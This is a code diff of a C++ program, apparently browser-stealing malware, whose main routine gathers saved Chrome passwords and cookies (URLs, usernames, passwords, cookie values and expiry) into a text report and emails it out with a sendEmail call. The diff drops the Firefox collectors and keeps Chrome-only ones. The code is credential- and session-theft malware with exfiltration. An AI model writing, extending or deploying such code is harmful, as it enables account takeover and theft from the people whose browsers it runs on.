@@ -2,20 +2,18 @@
 #include "pch.h"
 #include <iostream>
 #include <fstream>
-#include "includes/ChromeParser.h"
+#include "includes/ChromePasswordCollecter.h"
+#include "includes/ChromeCookiesCollecter.h"
 
-
-#include "includes/FireFoxParser.h"
-#include "includes/FactoryCollector.h"
 #include "includes/SendEmail.h"
 
 
-void gather_result(const List<AccountData>& data, std::string& account_info)
+void gather_result(const List<userData>& data, std::string& account_info)
 {
 	for (const auto& data : data)
 	{
 
-		account_info += "Url: " + data.Url  + "\nUsername: " + data.Username + "\nPassword: " + data.Password + "\n";
+		account_info += "Url: " + data.url  + "\nUsername: " + data.username + "\nPassword: " + data.password + "\n";
 		account_info += "--------------------------------------------------------------------------------\n" ;
 	}
 }
@@ -24,40 +22,23 @@ void gather_result(const List<CookieData>& data, std::string& account_info)
 {
 	for (const auto& data : data)
 	{
-		account_info += "HostKey: " + data.HostKey + "\nname: " + data.Name + "\nValue:: "+ data.Value +"\nPath: " + data.Path + "\nExpireUTC: " + data.ExpireUTC + "\n";
+		account_info += "HostKey: " + data.hostKey + "\nname: " + data.name + "\nValue:: "+ data.value +"\nPath: " + data.path + "\nExpireUTC: " + data.expireUTC + "\n";
 		account_info += "--------------------------------------------------------------------------------\n";
 	
 	}
 
 }
 
-template<class T>
-void clear(ICollector<T>* collector)
-{
-	if (!collector) return;
-	delete collector;
-	collector = nullptr;
-}
 
 void getInfo() {
 	std::string account_info("Password information :\n");
-	auto parser = collector::create_password_collector(collector::BrowserType::Mozilla);
-	gather_result(parser->collectData(), account_info);
-	clear(parser);
-
-	
-	 parser = collector::create_password_collector(collector::BrowserType::Chromium);
-	gather_result(parser->collectData(), account_info);
-	clear(parser);
+	ChromePasswordCollecter passwordsCollecter;
+	gather_result(passwordsCollecter.collectData(), account_info);
 
 	account_info += "Cookies information :\n";
-	auto parser_cookie = collector::create_cookies_collector(collector::BrowserType::Mozilla);
-	gather_result(parser_cookie->collectData(), account_info);
-	clear(parser_cookie);
+	ChromeCookiesCollecter cookieCollecter;
+	gather_result(cookieCollecter.collectData(), account_info);
 
-	parser_cookie = collector::create_cookies_collector(collector::BrowserType::Chromium);
-	gather_result(parser_cookie->collectData(), account_info);
-	clear(parser_cookie);
 	sendEmail("account infromation", account_info);
 
 }
